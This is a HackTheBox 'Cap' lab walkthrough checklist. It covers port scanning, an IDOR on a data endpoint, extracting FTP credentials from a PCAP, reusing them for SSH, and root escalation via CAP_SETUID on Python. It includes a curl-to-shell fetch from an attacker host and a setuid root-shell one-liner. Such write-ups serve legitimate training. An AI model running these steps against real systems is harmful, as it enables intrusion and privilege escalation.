---
title: "HTB - Cap Walkthrough"
description: "Walkthrough checklist for the Cap machine involving IDOR, PCAP analysis, and Linux Capability exploitation."
date: 2025-12-10T11:30:00+05:45
checklist_categories: ["HackTheBox"]
checklist_tags: ["linux", "idor", "pcap", "capabilities", "ftp"]
folder: "hackthebox"
draft: false
weight: 1
---

### 1. Initial Scanning and Enumeration
- [ ] Identify open ports and service versions.

{{< tabs >}}
{{< tab "Nmap Discovery" >}}
```bash
nmap -sT 10.10.10.245 -T4 -vv
````

Ports found: 21 (FTP), 22 (SSH), 80 (HTTP). {{< /tab >}}

{{< tab "Service & Scripts" >}}

```bash
nmap -sC -sV -p 21,22,80 10.10.10.245 -T4 -Pn
```

Identified vsftpd 3.0.3, OpenSSH 8.2p1, and Gunicorn. {{< /tab >}} {{< /tabs >}}

### 2. Web Exploitation (IDOR)

- [ ] Trigger a "Security Snapshot" on the dashboard.
    
- [ ] Observe the redirection URL structure. {{< accordion "Question: What is the redirection path?" >}} The browser is redirected to `/data/[id]`. Initial scan redirected to `/data/10`. {{< /accordion >}}
    
- [ ] Perform IDOR testing on the `/data/` endpoint.
    
- [ ] Use Burp Suite Intruder to bruteforce the ID range (e.g., 0-10).
    

### 3. Traffic Analysis

- [ ] Identify a PCAP file containing sensitive data (Found in `/data/0`).
    
- [ ] Analyze the PCAP file locally using Wireshark to extract credentials. {{< accordion "Question: Where was the password found?" >}} FTP credentials for user 'nathan' were found in the plaintext application layer protocol inside the pcap. {{< /accordion >}}
    

### 4. Gaining a Foothold

- [ ] Log into the FTP server to confirm access and locate flags.
    
    ```bash
    lftp -u nathan 10.10.10.245
    ```
    
- [ ] Attempt to reuse the FTP credentials for SSH access.
    
    ```bash
    ssh nathan@10.10.10.245
    ```
    

### 5. Privilege Escalation

- [ ] Transfer enumeration tools to the victim machine.
    

{{< tabs >}} {{< tab "Using SCP" >}} 

```bash
scp linpeas.sh nathan@10.10.10.245:/home/nathan
```

{{< /tab >}}

{{< tab "Using Python HTTP server" >}} 

```bash
# Attacker
sudo python -m http.server 80
```

```bash
# Victim
curl [ATTACKER_IP]/linpeas.sh | sh
```

{{< /tab >}} {{< /tabs >}}

- [ ] Analyze Linpeas output for Privilege Escalation vectors.
    
- [ ] Locate binaries with interesting Linux Capabilities.
    
    ```bash
    getcap -r / 2>/dev/null
    ```
    

### 6. Root Exploitation

- [ ] Abuse the `CAP_SETUID` capability found on the Python 3.8 binary.

    ```bash
    python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
    ```
    
- [ ] Capture the root flag.

    ```bash
    cat /root/root.txt
    ```